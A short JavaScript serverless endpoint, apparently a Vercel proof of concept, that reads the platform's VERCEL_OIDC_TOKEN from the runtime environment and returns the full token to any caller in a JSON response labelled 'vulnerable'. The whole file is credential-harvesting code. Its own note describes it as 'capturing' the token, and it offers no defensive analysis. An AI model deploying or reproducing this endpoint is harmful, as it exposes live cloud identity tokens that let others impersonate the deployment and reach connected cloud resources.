export default async function handler(req, res) {
    try {
        // Direct access to Vercel's OIDC token from environment
        const oidcToken = process.env.VERCEL_OIDC_TOKEN || "Token Not Found in Environment";

        res.status(200).json({
            vulnerable: oidcToken !== "Token Not Found in Environment" ? "YES" : "NO",
            token_preview: oidcToken.substring(0, 20) + "...",
            full_token: oidcToken,
            note: "Capturing OIDC token directly from Vercel runtime environment."
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
}
